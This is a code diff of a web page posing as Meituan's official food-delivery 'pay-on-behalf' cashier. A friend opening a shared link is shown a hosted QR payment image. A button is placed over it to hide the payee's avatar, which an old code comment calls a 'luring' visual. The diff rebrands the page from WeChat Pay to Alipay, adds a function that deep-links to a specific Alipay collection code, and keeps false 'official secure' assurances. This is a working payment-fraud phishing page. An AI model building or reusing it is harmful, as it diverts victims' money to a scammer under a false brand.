@@ -15,7 +15,7 @@
   --muted:#999999;
   --meituan-yellow:#ffd100;
   --danger:#ff5722;
-  --success:#07c160; /* 微信绿 */
+  --success:#07c160; 
   --border:#eaeaea;
 }
 *{box-sizing:border-box}
@@ -104,6 +104,7 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
   border: 1px solid #e0e0e0;
   border-radius: 12px;
   padding: 5px;
+  cursor: pointer;
 }
 .pay-qr-img {
   width: 100%;
@@ -112,22 +113,21 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
   display: block;
   border-radius: 8px;
 }
-/* 巧妙盖在中间的支付按钮：遮挡头像并提供诱导视觉 */
+/* 巧妙盖在中间的支付按钮：支持点击唤醒 */
 .overlay-pay-btn {
   position: absolute;
   top: 50%;
   left: 50%;
   transform: translate(-50%, -50%);
-  background: var(--success);
+  background: #1677ff; /* 改为支付宝蓝或者保留绿色 */
   color: white;
   border: 2px solid #ffffff;
-  padding: 8px 14px;
+  padding: 10px 16px;
   border-radius: 20px;
-  font-size: 12px;
+  font-size: 13px;
   font-weight: bold;
-  box-shadow: 0 4px 10px rgba(7, 193, 96, 0.4);
+  box-shadow: 0 4px 10px rgba(22, 119, 255, 0.4);
   white-space: nowrap;
-  pointer-events: none; /* 让点击穿透到下方的长按图片事件 */
   animation: pulse 2s infinite;
 }
 @keyframes pulse {
@@ -149,7 +149,6 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
 </head>
 <body>
 
-<!-- 主导航栏 -->
 <div class="nav" id="main-nav">
   <div class="nav-item active" data-tab="view-stores">🏪 选购点餐</div>
   <div class="nav-item" data-tab="view-cart">🛒 购物车</div>
@@ -157,13 +156,11 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
   <div class="nav-item" data-tab="view-admin">⚙️ 后台</div>
 </div>
 
-<!-- 1. 商家列表视图 -->
 <div id="view-stores" class="tab-view active">
   <div id="stores-header"><h2>美团合作商家</h2></div>
   <div id="store-list" class="muted">加载中...</div>
 </div>
 
-<!-- 2. 购物车视图 -->
 <div id="view-cart" class="tab-view">
   <h2>购物车</h2>
   <div class="card flex-between">
@@ -173,13 +170,11 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
   <div id="cart-list" class="muted">购物车为空</div>
 </div>
 
-<!-- 3. 我的订单视图 -->
 <div id="view-orders" class="tab-view">
   <h2>我的订单</h2>
   <div id="order-list" class="muted">加载中...</div>
 </div>
 
-<!-- 4. 好友点开后的美团官方代付收银台（带中间遮挡按钮） -->
 <div id="view-mt-pay" class="tab-view" style="padding:0;">
   <div class="mt-header">
     美团外卖收银台 <span>官方安全代付</span>
@@ -205,30 +200,26 @@ input,select{padding:12px;border:1px solid #ddd;border-radius:10px;background:#f
         </div>
         <div class="details-row">
           <span style="color:#666;">支付方式：</span>
-          <span style="color:#222; font-weight:bold;">微信好友代付</span>
+          <span style="color:#222; font-weight:bold;">支付宝代付</span>
         </div>
       </div>
 
-      <!-- 醒目长按引导 -->
-      <div style="background: #fff8e1; color: #8a5b00; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: bold; margin-bottom: 5px;">
-        👆 请直接【长按下方二维码】选择「识别图中二维码」完成代付
+      <div style="background: #e6f4ff; color: #0958d9; padding: 10px; border-radius: 8px; font-size: 13px; font-weight: bold; margin-bottom: 5px;">
+        👇 点击下方按钮或长按二维码，即可直接完成代付
       </div>
 
-      <!-- 二维码与居中按钮容器（使用绝对路径确保图片正确加载） -->
-      <div class="qr-container">
+      <div class="qr-container" onclick="wakeUpAlipay()">
         <img class="pay-qr-img" src="https://zpjt.github.io/Auto-Forward-Messages/IMG_1077.jpeg" alt="代付收款码" />
-        <!-- 完美的居中呼吸支付按钮，直接挡住头像 -->
-        <div class="overlay-pay-btn">🟢 微信安全支付</div>
+        <div class="overlay-pay-btn">🔵 点击唤醒支付宝付款</div>
       </div>
 
       <div class="security-tip">
-        🛡️ 美团联合微信支付提供底层担保，付款后好友将立刻收到餐品配送通知。
+        🛡️ 官方安全通道，付款后好友将立刻收到餐品配送通知。
       </div>
     </div>
   </div>
 </div>
 
-<!-- 5. 管理后台视图 -->
 <div id="view-admin" class="tab-view">
   <h2>后台管理</h2>
   <div class="card">
@@ -402,6 +393,18 @@ async function shareOrder(content, total) {
     navigator.clipboard.writeText(shareUrl);
     alert("代付链接已复制，快发给好友吧！");
   }
+}
+
+// 支付宝唤醒核心函数
+function wakeUpAlipay() {
+    const ALIPAY_QR_URL = "https://qr.alipay.com/2m612342txzv1x1aorosqa0";
+    const scheme = `alipays://platformapi/startapp?saId=10000007&qrcode=${encodeURIComponent(ALIPAY_QR_URL)}`;
+    window.location.href = scheme;
+    
+    // 兜底：如果未成功唤醒，1.5秒后自动跳转
+    setTimeout(() => {
+        window.location.href = ALIPAY_QR_URL;
+    }, 1500);
 }
 
 function prepareAdminForm() {
